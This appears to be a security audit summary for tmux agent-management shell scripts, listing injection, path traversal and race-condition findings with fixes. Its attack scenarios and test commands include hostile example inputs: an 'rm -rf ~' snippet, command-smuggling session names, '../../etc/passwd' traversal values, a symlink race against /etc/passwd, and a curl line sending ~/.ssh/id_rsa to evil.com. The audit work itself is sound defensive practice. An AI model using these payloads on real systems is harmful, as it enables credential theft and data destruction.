# Security Audit - Quick Reference

**Date**: 2026-01-07
**Risk Level**: MEDIUM-HIGH
**Total Findings**: 23 (5 Critical, 11 Important, 7 Defense-in-Depth)

---

## 🚨 Critical Issues (P1) - Fix Immediately

### 1. snippet-picker Missing Literal Flag (REGRESSION!)
- **File**: `bin/snippet-picker:170`
- **Issue**: TODO-001 marked complete but fix NOT applied
- **Fix**: `tmux send-keys -t "$TARGET_PANE" -l "$text"`

### 2. Command Injection in agent-manage fzf Preview
- **File**: `bin/agent-manage:310,314`
- **Issue**: SESSION_NAME interpolated into preview without escaping
- **Fix**: Use `printf %q "$SESSION_NAME"` or static preview

### 3. Path Traversal in State Files
- **File**: `bin/agent-flow-state:13`
- **Issue**: Can write outside STATE_DIR with `../../` patterns
- **Fix**: Add path traversal check to `get_session_name()`

### 4. Command Injection in agent-handoff Preview
- **File**: `bin/agent-handoff:203`
- **Issue**: Pane ID passed to shell without validation
- **Fix**: Validate pane ID format strictly

### 5. Race Condition in Worktree Creation
- **File**: `bin/agent-worktree:136-167`
- **Issue**: TOCTOU - symlink attack possible
- **Fix**: Use git's atomic operations only

---

## ⚠️ Important Issues (P2) - Fix Before Production

1. **Incomplete Pane Name Validation** - agent-manage:138,223
2. **Unquoted Array Assignment** - agent-session:103, agent-delegate:122,146
3. **Clipboard Content Injection** - agent-manage:440 (needs sanitization)
4. **Missing Task ID Validation** - agent-session:73 (partial)
5. **Control Character Injection** - agent-flow:60
6. **Directory Traversal in Worktree Paths** - agent-worktree:133
7. **Unsafe grep with User Input** - snippet-picker:138 (needs -F flag)
8. **Session Name Regex Injection** - agent-status:67 (fragile)
9. **Unvalidated Git Branch Names** - agent-worktree:153-166
10. **Missing Length Validation** - agent-flow-state:49-61
11. **Command Injection Risk in install.sh** - install.sh:30-32

---

## 🛡️ Defense-in-Depth (P3) - Recommended

1. **File Permissions Check** - agent-flow-state:10
2. **Information Disclosure in Status** - agent-status:120
3. **No Input Timeout** - agent-manage (multiple read commands)
4. **Weak Backup Naming** - install.sh:14
5. **No Clipboard Tool Verification** - agent-common.sh:73-87
6. **Missing Error Handling** - agent-flow-state:54
7. **No Pane Content Sanitization** - agent-handoff:222-225

---

## Quick Fix Checklist

```bash
# 1. Fix snippet-picker (P1-3) - CRITICAL REGRESSION
# Line 170: Add -l flag
tmux send-keys -t "$TARGET_PANE" -l "$text"

# 2. Fix agent-manage previews (P1-1)
# Lines 310, 314: Escape SESSION_NAME
preview_cmd="tmux capture-pane -p -S - -t $(printf %q "$SESSION_NAME").{1} 2>/dev/null | tail -30"

# 3. Add path traversal check (P1-4)
# In agent-common.sh get_session_name(), add:
if [[ "$name" =~ \.\. ]] || [[ "$name" =~ / ]]; then
    echo "agents"
    return 1
fi

# 4. Fix snippet-picker grep (P2-7)
# Line 138: Add -F for literal matching
snippets=$(echo "$PARSED_SNIPPETS" | grep -F "^${selected_folder}/")

# 5. Sanitize clipboard (P2-3)
# In agent-manage:440, before send-keys:
content=$(echo "$content" | tr -cd '[:print:]\n\t')
```

---

## Attack Scenarios

### Scenario 1: Malicious Snippet Execution
```bash
# Attacker adds to snippets.txt:
rm -rf ~
[ENTER KEY]

# Without -l flag, this executes when snippet is sent
# FIX: Use -l flag in snippet-picker
```

### Scenario 2: Path Traversal
```bash
# Attacker sets environment:
export AGENT_SESSION='../../etc/passwd'
agent-flow-state set PLANNING

# Creates file: ~/.cache/../../etc/passwd.state
# FIX: Reject .. and / in session names
```

### Scenario 3: Command Injection via Preview
```bash
# If SESSION_NAME validation is bypassed:
AGENT_SESSION='test$(curl evil.com/steal?data=$(cat ~/.ssh/id_rsa))'
agent-manage copy  # fzf preview executes the injection

# FIX: Proper escaping in preview commands
```

### Scenario 4: Race Condition
```bash
# Terminal 1:
agent-worktree feat-auth

# Terminal 2 (attacker, running in loop):
rm -rf ../myrepo-feat-auth 2>/dev/null
ln -s /etc/passwd ../myrepo-feat-auth

# If timing is right, worktree writes to /etc/passwd
# FIX: Use atomic git operations only
```

---

## Testing Commands

```bash
# Test path traversal
export AGENT_SESSION='../../tmp/evil'
agent-flow-state set PLANNING
ls ~/.cache/../../tmp/evil.state

# Test snippet injection
echo 'whoami' > test-snippet.txt
# Import and send - should NOT execute

# Test clipboard injection
echo -e 'evil\x00command' | pbcopy
agent-manage paste 0

# Test session name validation
agent-session 'test$(whoami)'
agent-session '../../../etc/passwd'
```

---

## Validation Patterns

### Good Examples from Codebase

```bash
# ✅ agent-common.sh:31 - Good input validation
if ! [[ "$name" =~ ^[a-zA-Z0-9_-]+$ ]]; then
    return 1
fi

# ✅ agent-manage:440 - Good use of -l flag
tmux send-keys -t "$SESSION_NAME.$pane_idx" -l "$content"

# ✅ agent-flow-state:52 - Good case statement validation
case "$state" in
    IDLE|PLANNING|WORKING|REVIEWING|COMPOUND|DONE)
        echo "$state" > "$STATE_FILE"
```

### Examples Needing Fixes

```bash
# ❌ snippet-picker:170 - Missing -l flag (REGRESSION)
tmux send-keys -t "$TARGET_PANE" "$text"
# Should be: -l "$text"

# ❌ agent-manage:310 - Unescaped variable in preview
preview_cmd="tmux capture-pane -p -S - -t '$SESSION_NAME.{1}'"
# Should use: $(printf %q "$SESSION_NAME")

# ❌ snippet-picker:138 - Regex injection
grep "^${selected_folder}/"
# Should be: grep -F "^${selected_folder}/"
```

---

## Priority Matrix

| Finding | Severity | Ease of Fix | Priority | Time Est |
|---------|----------|-------------|----------|----------|
| P1-3 Snippet literal flag | Critical | Easy | 1 | 5 min |
| P1-4 Path traversal | Critical | Easy | 2 | 10 min |
| P2-7 grep -F flag | High | Easy | 3 | 5 min |
| P2-3 Clipboard sanitization | High | Easy | 4 | 15 min |
| P1-1 Preview escaping | Critical | Medium | 5 | 30 min |
| P1-2 Pane ID validation | Critical | Medium | 6 | 20 min |
| P1-5 Race condition | Critical | Hard | 7 | 1 hour |
| P2-1 Pane name validation | High | Medium | 8 | 45 min |
| P2-2 Array assignment | High | Easy | 9 | 15 min |

**Total estimated fix time for P1 issues: ~2.5 hours**
**Total estimated fix time for all P1+P2 issues: ~6 hours**

---

## Before/After Examples

### Fix 1: snippet-picker Literal Flag
```bash
# BEFORE (vulnerable)
tmux send-keys -t "$TARGET_PANE" "$text"

# AFTER (secure)
tmux send-keys -t "$TARGET_PANE" -l "$text"
```

### Fix 2: Path Traversal Prevention
```bash
# BEFORE (vulnerable)
if ! [[ "$name" =~ ^[a-zA-Z0-9_-]+$ ]]; then
    return 1
fi

# AFTER (secure)
if ! [[ "$name" =~ ^[a-zA-Z0-9_-]+$ ]]; then
    return 1
fi
# Add additional check
if [[ "$name" =~ \.\. ]] || [[ "$name" =~ / ]]; then
    return 1
fi
```

### Fix 3: Preview Command Escaping
```bash
# BEFORE (vulnerable)
preview_cmd="tmux capture-pane -p -S - -t '$SESSION_NAME.{1}' 2>/dev/null"

# AFTER (secure)
preview_cmd="tmux capture-pane -p -S - -t $(printf %q "$SESSION_NAME").{1} 2>/dev/null"
```

---

## Shell Script Security Principles

1. **Always Quote Variables**: `"$var"` not `$var`
2. **Use Literal Mode**: `tmux send-keys -l` for untrusted input
3. **Validate Input**: Allowlist with regex, not blocklist
4. **Escape for Context**: Use `printf %q` for shell escaping
5. **Avoid eval**: Never use `eval` with user input
6. **Use -F with grep**: Fixed string matching prevents regex injection
7. **Check Return Codes**: Always verify command success
8. **Atomic Operations**: Use built-in atomic operations (git, tmux)
9. **Minimal Permissions**: `chmod 700` for sensitive directories
10. **Sanitize Output**: Strip control characters and ANSI codes

---

## Next Steps

1. **Immediate** (Today):
   - Fix P1-3 (snippet-picker regression)
   - Fix P1-4 (path traversal)
   - Fix P2-7 (grep -F)

2. **This Week**:
   - Fix all remaining P1 issues
   - Test fixes thoroughly
   - Update TODO markers

3. **This Month**:
   - Fix all P2 issues
   - Implement P3 improvements
   - Add automated security tests
   - Document secure usage patterns

4. **Ongoing**:
   - Regular security reviews
   - Shellcheck integration
   - Fuzzing test suite
   - Security training for contributors

---

**For detailed information, see SECURITY_AUDIT_REPORT.md**
